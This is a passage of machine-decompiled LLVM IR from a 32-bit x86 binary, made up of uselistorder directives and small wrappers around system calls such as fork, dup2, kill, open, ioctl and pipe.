  uselistorder i32 %stack_var_-224.229, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 27, 24, 23, 22, 20, 19, 18, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 17, 16, 21, 26, 25, 29, 28 }
  uselistorder i32 %v1_804a145, { 1, 13, 12, 14, 11, 10, 15, 9, 20, 19, 18, 21, 17, 22, 16, 31, 30, 29, 27, 28, 35, 37, 36, 34, 39, 38, 33, 32, 26, 25, 24, 40, 23, 46, 45, 47, 44, 43, 42, 41, 58, 57, 56, 54, 55, 59, 53, 61, 60, 52, 51, 50, 49, 62, 48, 68, 67, 69, 66, 65, 64, 63, 79, 78, 77, 75, 76, 81, 80, 74, 73, 72, 82, 71, 83, 70, 90, 89, 88, 92, 91, 97, 96, 95, 98, 94, 93, 87, 86, 85, 99, 84, 4, 2, 3, 5, 6, 7, 107, 106, 105, 108, 104, 109, 103, 110, 102, 101, 100, 0, 8 }
  uselistorder i32 %v4_804a008, { 2, 1, 0 }
  uselistorder i32 %v2_8049fac, { 1, 0, 2 }
  uselistorder i32 %storemerge548, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %v2_8049faf, { 1, 0, 4, 3, 2, 7, 6, 5, 9, 8, 11, 10, 13, 12, 14, 16, 17, 15, 18, 19 }
  uselistorder i1 %v5_804a01147, { 1, 0 }
  uselistorder i32 %v2_8049f88, { 1, 0 }
  uselistorder i32 %v2_8049f6b, { 18, 5, 6, 19, 7, 8, 20, 9, 22, 21, 10, 23, 11, 24, 12, 13, 14, 25, 15, 27, 1, 2, 3, 4, 26, 0, 16, 17 }
  uselistorder i32 %.v2_8049ee0, { 4, 5, 7, 6, 3, 0, 1, 2 }
  uselistorder i32 %v2_8049ee0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-204, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-172, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-180, { 1, 0, 5, 4, 3, 2, 6, 7 }
  uselistorder i32* %stack_var_-184, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32* %stack_var_-188, { 1, 5, 4, 8, 0, 7, 6, 3, 9, 2, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 23, 29, 30, 31, 32, 28, 33, 34, 35, 36, 37, 39, 40, 38, 42, 41, 43, 44, 128, 127, 129, 130, 131, 132, 133, 135, 136, 137, 138, 134, 45, 46, 47, 48, 50, 51, 49, 53, 52, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 106, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 212, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 7, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 48, 56, 57, 58, 59, 54, 55, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 74, 72, 75, 78, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 235, 236, 237, 238, 239, 240, 234, 88, 89, 90, 91, 92, 93, 94, 95, 97, 98, 96, 99, 102, 100, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 146, 145, 147, 148, 149, 150, 153, 151, 152, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 193, 206, 207, 208, 209, 210, 211, 0, 216, 213, 214, 215, 219, 217, 218 }
  uselistorder i32 (i32, i8*)* @function_804f284, { 0, 4, 5, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f64c, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i8*)* @_strlen, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 ()* @function_8049875, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804f5dc, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804e074, { 4, 3, 2, 1, 0 }
  uselistorder i32 10000, { 2, 3, 4, 0, 1 }
  uselistorder i32 -28, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32 -24, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32 -20, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32 (i32*)* @function_804e134, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @function_8049e8b, { 15, 14, 13, 12, 11, 10, 9, 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804f584, { 1, 0 }
  uselistorder i8 7, { 2, 0, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i32 (i32)* @function_804f4d0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b3cf, { 32, 1, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 6, 30, 31, 20, 21, 22, 23, 3, 24, 25, 4, 26, 27, 28, 5, 29, 0 }
  uselistorder label %dec_label_pc_804b29d, { 1, 0 }
  uselistorder label %dec_label_pc_804adf1, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a6bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a685, { 1, 0 }
  uselistorder label %dec_label_pc_804a5cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a387, { 1, 0 }
  uselistorder label %dec_label_pc_804a19f, { 1, 0 }
  uselistorder label %dec_label_pc_804a01f, { 1, 0 }
  uselistorder label %dec_label_pc_804a013, { 1, 0 }
  uselistorder label %dec_label_pc_804a013.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa0, { 1, 0 }
}

define i32 @function_804dd1c() local_unnamed_addr {
dec_label_pc_804dd1c:
  %v0_804dd22 = call i32 @vfork()
  %v5_804dd25 = icmp ult i32 %v0_804dd22, -4095
  %v1_804dd2a = icmp eq i1 %v5_804dd25, false
  call void @__pseudo_cond_branch(i1 %v1_804dd2a, i32 134549752)
  ret i32 %v0_804dd22
}

define i32 @function_804dd34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804dd34:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dd34 = load i32, i32* @edi, align 4
  %v0_804dd35 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dd49 = add i32 %arg2, -12
  %v6_804dd53 = icmp ugt i32 %v1_804dd49, 2
  br i1 %v6_804dd53, label %dec_label_pc_804dd63, label %dec_label_pc_804dd55

dec_label_pc_804dd55:                             ; preds = %dec_label_pc_804dd34
  %v4_804dd59 = call i32 @function_804dd8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804dd49)
  br label %dec_label_pc_804dd85

dec_label_pc_804dd63:                             ; preds = %dec_label_pc_804dd34
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804dd6b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804dd6b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804dd6b, -4095
  br i1 %tmp17, label %dec_label_pc_804dd83, label %dec_label_pc_804dd77

dec_label_pc_804dd77:                             ; preds = %dec_label_pc_804dd63
  %v1_804dd77 = call i32 @function_804e1ec(i32 %v0_804dd35)
  %v0_804dd7c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd7c = sub i32 0, %v0_804dd7c
  %v2_804dd7e = inttoptr i32 %v1_804dd77 to i32*
  store i32 %v1_804dd7c, i32* %v2_804dd7e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd83

dec_label_pc_804dd83:                             ; preds = %dec_label_pc_804dd63, %dec_label_pc_804dd77
  %v0_804dd83 = phi i32 [ %v2_804dd6b, %dec_label_pc_804dd63 ], [ -1, %dec_label_pc_804dd77 ]
  br label %dec_label_pc_804dd85

dec_label_pc_804dd85:                             ; preds = %dec_label_pc_804dd55, %dec_label_pc_804dd83
  %v0_804dd8a = phi i32 [ %v4_804dd59, %dec_label_pc_804dd55 ], [ %v0_804dd83, %dec_label_pc_804dd83 ]
  store i32 %v0_804dd35, i32* @ebx, align 4
  store i32 %v0_804dd34, i32* @edi, align 4
  ret i32 %v0_804dd8a

; uselistorder directives
  uselistorder i32 %v2_804dd6b, { 1, 0, 2 }
  uselistorder i32 %v0_804dd35, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dd85, { 1, 0 }
  uselistorder label %dec_label_pc_804dd83, { 1, 0 }
}

define i32 @function_804dd8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804dd8c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd8c = load i32, i32* @edi, align 4
  store i32 %v0_804dd8c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dda4 = load i32, i32* @ebx, align 4
  %v1_804ddac = call i32 @int80_syscall(i32 221)
  store i32 %v1_804ddac, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804ddac, -4095
  br i1 %tmp12, label %dec_label_pc_804ddc4, label %dec_label_pc_804ddb8

dec_label_pc_804ddb8:                             ; preds = %dec_label_pc_804dd8c
  %v1_804ddb8 = call i32 @function_804e1ec(i32 %v0_804dda4)
  %v0_804ddbd = load i32, i32* %edi.global-to-local, align 4
  %v1_804ddbd = sub i32 0, %v0_804ddbd
  %v2_804ddbf = inttoptr i32 %v1_804ddb8 to i32*
  store i32 %v1_804ddbd, i32* %v2_804ddbf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804ddc9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ddc4

dec_label_pc_804ddc4:                             ; preds = %dec_label_pc_804dd8c, %dec_label_pc_804ddb8
  %v2_804ddc9 = phi i32 [ %v0_804dd8c, %dec_label_pc_804dd8c ], [ %v2_804ddc9.pre, %dec_label_pc_804ddb8 ]
  %v0_804ddc4 = phi i32 [ %v1_804ddac, %dec_label_pc_804dd8c ], [ -1, %dec_label_pc_804ddb8 ]
  store i32 %v2_804ddc9, i32* %edi.global-to-local, align 4
  ret i32 %v0_804ddc4

; uselistorder directives
  uselistorder i32 %v1_804ddac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ddc4, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804ddcc(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804ddcc:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804de24(i32 %arg1) local_unnamed_addr {
dec_label_pc_804de24:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de24 = load i32, i32* @edi, align 4
  store i32 %v0_804de24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804de2c = load i32, i32* @ebx, align 4
  %v1_804de34 = call i32 @close(i32 %arg1)
  store i32 %v0_804de2c, i32* @ebx, align 4
  store i32 %v1_804de34, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804de34, -4095
  br i1 %tmp9, label %dec_label_pc_804de4c, label %dec_label_pc_804de40

dec_label_pc_804de40:                             ; preds = %dec_label_pc_804de24
  %v1_804de40 = call i32 @function_804e1ec(i32 %v0_804de2c)
  %v0_804de45 = load i32, i32* %edi.global-to-local, align 4
  %v1_804de45 = sub i32 0, %v0_804de45
  %v2_804de47 = inttoptr i32 %v1_804de40 to i32*
  store i32 %v1_804de45, i32* %v2_804de47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804de50.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804de4c

dec_label_pc_804de4c:                             ; preds = %dec_label_pc_804de24, %dec_label_pc_804de40
  %v2_804de50 = phi i32 [ %v0_804de24, %dec_label_pc_804de24 ], [ %v2_804de50.pre, %dec_label_pc_804de40 ]
  %v0_804de4c = phi i32 [ %v1_804de34, %dec_label_pc_804de24 ], [ -1, %dec_label_pc_804de40 ]
  store i32 %v2_804de50, i32* @edi, align 4
  ret i32 %v0_804de4c

; uselistorder directives
  uselistorder i32 %v1_804de34, { 1, 0, 2 }
  uselistorder i32 %v0_804de2c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804de4c, { 1, 0 }
}

define i32 @function_804de54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804de54:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de54 = load i32, i32* @ebx, align 4
  store i32 %v0_804de54, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804de67 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_804de67, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804de67, -4095
  br i1 %tmp9, label %dec_label_pc_804de80, label %dec_label_pc_804de74

dec_label_pc_804de74:                             ; preds = %dec_label_pc_804de54
  %v1_804de74 = call i32 @function_804e1ec(i32 %v0_804de54)
  %v0_804de79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de79 = sub i32 0, %v0_804de79
  %v2_804de7b = inttoptr i32 %v1_804de74 to i32*
  store i32 %v1_804de79, i32* %v2_804de7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804de84.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804de80

dec_label_pc_804de80:                             ; preds = %dec_label_pc_804de54, %dec_label_pc_804de74
  %v2_804de84 = phi i32 [ %v0_804de54, %dec_label_pc_804de54 ], [ %v2_804de84.pre, %dec_label_pc_804de74 ]
  %v0_804de80 = phi i32 [ %v2_804de67, %dec_label_pc_804de54 ], [ -1, %dec_label_pc_804de74 ]
  store i32 %v2_804de84, i32* @ebx, align 4
  ret i32 %v0_804de80

; uselistorder directives
  uselistorder i32 %v2_804de67, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804de80, { 1, 0 }
}

define i32 @function_804de88(i32 %arg1) local_unnamed_addr {
dec_label_pc_804de88:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de88 = load i32, i32* @ebx, align 4
  store i32 %v0_804de88, i32* %stack_var_-4, align 4
  %v1_804de91 = call i32 @fork(i32 %v0_804de88)
  store i32 %v1_804de91, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804de91, -4095
  br i1 %tmp7, label %dec_label_pc_804dea8, label %dec_label_pc_804de9c

dec_label_pc_804de9c:                             ; preds = %dec_label_pc_804de88
  %v1_804de9c = call i32 @function_804e1ec(i32 %v0_804de88)
  %v0_804dea1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dea1 = sub i32 0, %v0_804dea1
  %v2_804dea3 = inttoptr i32 %v1_804de9c to i32*
  store i32 %v1_804dea1, i32* %v2_804dea3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804deac.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804dea8

dec_label_pc_804dea8:                             ; preds = %dec_label_pc_804de88, %dec_label_pc_804de9c
  %v2_804deac = phi i32 [ %v0_804de88, %dec_label_pc_804de88 ], [ %v2_804deac.pre, %dec_label_pc_804de9c ]
  %v0_804dea8 = phi i32 [ %v1_804de91, %dec_label_pc_804de88 ], [ -1, %dec_label_pc_804de9c ]
  store i32 %v2_804deac, i32* @ebx, align 4
  ret i32 %v0_804dea8

; uselistorder directives
  uselistorder i32 %v1_804de91, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dea8, { 1, 0 }
}

define i32 @function_804deb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804deb0:
  %stack_var_-8 = alloca i32, align 4
  %v2_804deb3 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804deba = call i32 @function_804df00(i32 7, i32 %v2_804deb3)
  %v2_804dec7 = icmp slt i32 %v2_804deba, 0
  br i1 %v2_804dec7, label %dec_label_pc_804decf, label %dec_label_pc_804decb

dec_label_pc_804decb:                             ; preds = %dec_label_pc_804deb0
  %v3_804decb = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804decf

dec_label_pc_804decf:                             ; preds = %dec_label_pc_804deb0, %dec_label_pc_804decb
  %v0_804decf = phi i32 [ 256, %dec_label_pc_804deb0 ], [ %v3_804decb, %dec_label_pc_804decb ]
  ret i32 %v0_804decf

; uselistorder directives
  uselistorder label %dec_label_pc_804decf, { 1, 0 }
}

define i32 @function_804ded8() local_unnamed_addr {
dec_label_pc_804ded8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ded8 = load i32, i32* @ebx, align 4
  store i32 %v0_804ded8, i32* %stack_var_-4, align 4
  %v1_804dee1 = call i32 @getpid(i32 %v0_804ded8)
  store i32 %v1_804dee1, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804dee1, -4095
  br i1 %tmp7, label %dec_label_pc_804def8, label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %dec_label_pc_804ded8
  %v1_804deec = call i32 @function_804e1ec(i32 %v0_804ded8)
  %v0_804def1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804def1 = sub i32 0, %v0_804def1
  %v2_804def3 = inttoptr i32 %v1_804deec to i32*
  store i32 %v1_804def1, i32* %v2_804def3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804defc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804def8

dec_label_pc_804def8:                             ; preds = %dec_label_pc_804ded8, %dec_label_pc_804deec
  %v2_804defc = phi i32 [ %v0_804ded8, %dec_label_pc_804ded8 ], [ %v2_804defc.pre, %dec_label_pc_804deec ]
  %v0_804def8 = phi i32 [ %v1_804dee1, %dec_label_pc_804ded8 ], [ -1, %dec_label_pc_804deec ]
  %v2_804defa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804defa, i32* @edx, align 4
  store i32 %v2_804defc, i32* @ebx, align 4
  ret i32 %v0_804def8

; uselistorder directives
  uselistorder i32 %v1_804dee1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804def8, { 1, 0 }
}

define i32 @function_804df00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804df00:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df00 = load i32, i32* @ebx, align 4
  store i32 %v0_804df00, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804df13 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804df13, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804df13, -4095
  br i1 %tmp9, label %dec_label_pc_804df2c, label %dec_label_pc_804df20

dec_label_pc_804df20:                             ; preds = %dec_label_pc_804df00
  %v1_804df20 = call i32 @function_804e1ec(i32 %v0_804df00)
  %v0_804df25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df25 = sub i32 0, %v0_804df25
  %v2_804df27 = inttoptr i32 %v1_804df20 to i32*
  store i32 %v1_804df25, i32* %v2_804df27, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804df30.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804df2c

dec_label_pc_804df2c:                             ; preds = %dec_label_pc_804df00, %dec_label_pc_804df20
  %v2_804df30 = phi i32 [ %v0_804df00, %dec_label_pc_804df00 ], [ %v2_804df30.pre, %dec_label_pc_804df20 ]
  %v0_804df2c = phi i32 [ %v1_804df13, %dec_label_pc_804df00 ], [ -1, %dec_label_pc_804df20 ]
  store i32 %v2_804df30, i32* @ebx, align 4
  ret i32 %v0_804df2c

; uselistorder directives
  uselistorder i32 %v1_804df13, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df2c, { 1, 0 }
}

define i32 @function_804df34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804df34:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df34 = load i32, i32* @edi, align 4
  store i32 %v0_804df34, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804df4c = load i32, i32* @ebx, align 4
  %v2_804df54 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_804df4c, i32* @ebx, align 4
  store i32 %v2_804df54, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_804df54, -4095
  br i1 %tmp12, label %dec_label_pc_804df6c, label %dec_label_pc_804df60

dec_label_pc_804df60:                             ; preds = %dec_label_pc_804df34
  %v1_804df60 = call i32 @function_804e1ec(i32 %v0_804df4c)
  %v0_804df65 = load i32, i32* %edi.global-to-local, align 4
  %v1_804df65 = sub i32 0, %v0_804df65
  %v2_804df67 = inttoptr i32 %v1_804df60 to i32*
  store i32 %v1_804df65, i32* %v2_804df67, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804df71.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804df6c

dec_label_pc_804df6c:                             ; preds = %dec_label_pc_804df34, %dec_label_pc_804df60
  %v2_804df71 = phi i32 [ %v0_804df34, %dec_label_pc_804df34 ], [ %v2_804df71.pre, %dec_label_pc_804df60 ]
  %v0_804df6c = phi i32 [ %v2_804df54, %dec_label_pc_804df34 ], [ -1, %dec_label_pc_804df60 ]
  store i32 %v2_804df71, i32* @edi, align 4
  ret i32 %v0_804df6c

; uselistorder directives
  uselistorder i32 %v2_804df54, { 1, 0, 2 }
  uselistorder i32 %v0_804df4c, { 1, 0 }
  uselistorder label %dec_label_pc_804df6c, { 1, 0 }
}

define i32 @function_804df74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804df74:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df74 = load i32, i32* @ebx, align 4
  store i32 %v0_804df74, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804df87 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804df87, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804df87, -4095
  br i1 %tmp9, label %dec_label_pc_804dfa0, label %dec_label_pc_804df94

dec_label_pc_804df94:                             ; preds = %dec_label_pc_804df74
  %v1_804df94 = call i32 @function_804e1ec(i32 %v0_804df74)
  %v0_804df99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df99 = sub i32 0, %v0_804df99
  %v2_804df9b = inttoptr i32 %v1_804df94 to i32*
  store i32 %v1_804df99, i32* %v2_804df9b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804dfa4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804dfa0

dec_label_pc_804dfa0:                             ; preds = %dec_label_pc_804df74, %dec_label_pc_804df94
  %v2_804dfa4 = phi i32 [ %v0_804df74, %dec_label_pc_804df74 ], [ %v2_804dfa4.pre, %dec_label_pc_804df94 ]
  %v0_804dfa0 = phi i32 [ %v2_804df87, %dec_label_pc_804df74 ], [ -1, %dec_label_pc_804df94 ]
  %v2_804dfa2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfa2, i32* @edx, align 4
  store i32 %v2_804dfa4, i32* @ebx, align 4
  ret i32 %v0_804dfa0

; uselistorder directives
  uselistorder i32 %v2_804df87, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dfa0, { 1, 0 }
}

define i32 @function_804dfa8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804dfa8:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dfa9 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804dfaf = sdiv i32 %sext, 16777216
  %v4_804dfb3 = ptrtoint i8* %arg1 to i32
  %v3_804dfb7 = and i32 %arg2, 64
  %v4_804dfb7 = icmp eq i32 %v3_804dfb7, 0
  br i1 %v4_804dfb7, label %dec_label_pc_804dfc8, label %dec_label_pc_804dfbc

dec_label_pc_804dfbc:                             ; preds = %dec_label_pc_804dfa8
  br label %dec_label_pc_804dfc8

dec_label_pc_804dfc8:                             ; preds = %dec_label_pc_804dfa8, %dec_label_pc_804dfbc
  store i32 %v4_804dfb3, i32* %ebx.global-to-local, align 4
  %v5_804dfd3 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804dfaf)
  store i32 %v5_804dfd3, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804dfd3, -4095
  br i1 %tmp15, label %dec_label_pc_804dfeb, label %dec_label_pc_804dfdf

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dfc8
  %v1_804dfdf = call i32 @function_804e1ec(i32 %v0_804dfa9)
  %v0_804dfe4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dfe4 = sub i32 0, %v0_804dfe4
  %v2_804dfe6 = inttoptr i32 %v1_804dfdf to i32*
  store i32 %v1_804dfe4, i32* %v2_804dfe6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfeb

dec_label_pc_804dfeb:                             ; preds = %dec_label_pc_804dfc8, %dec_label_pc_804dfdf
  %v0_804dfeb = phi i32 [ %v5_804dfd3, %dec_label_pc_804dfc8 ], [ -1, %dec_label_pc_804dfdf ]
  store i32 %v0_804dfa9, i32* @ebx, align 4
  ret i32 %v0_804dfeb

; uselistorder directives
  uselistorder i32 %v5_804dfd3, { 1, 0, 2 }
  uselistorder i32 %v0_804dfa9, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804dfeb, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc8, { 1, 0 }
}

define i32 @function_804dff3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804dff3:
  %v3_804e003 = inttoptr i32 %arg1 to i8*
  %v4_804e003 = call i32 @function_804dfa8(i8* %v3_804e003, i32 577)
  ret i32 %v4_804e003
}

define i32 @function_804e00c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e00c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e00c = load i32, i32* @edi, align 4
  store i32 %v0_804e00c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e014 = load i32, i32* @ebx, align 4
  %v1_804e01c = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804e01c = call i32 @pipe([2 x i32] %v1_804e01c)
  store i32 %v0_804e014, i32* @ebx, align 4
  store i32 %v2_804e01c, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804e01c, -4095
  br i1 %tmp9, label %dec_label_pc_804e034, label %dec_label_pc_804e028

dec_label_pc_804e028:                             ; preds = %dec_label_pc_804e00c
  %v1_804e028 = call i32 @function_804e1ec(i32 %v0_804e014)
  %v0_804e02d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e02d = sub i32 0, %v0_804e02d
  %v2_804e02f = inttoptr i32 %v1_804e028 to i32*
  store i32 %v1_804e02d, i32* %v2_804e02f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804e038.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e034

dec_label_pc_804e034:                             ; preds = %dec_label_pc_804e00c, %dec_label_pc_804e028
  %v2_804e038 = phi i32 [ %v0_804e00c, %dec_label_pc_804e00c ], [ %v2_804e038.pre, %dec_label_pc_804e028 ]
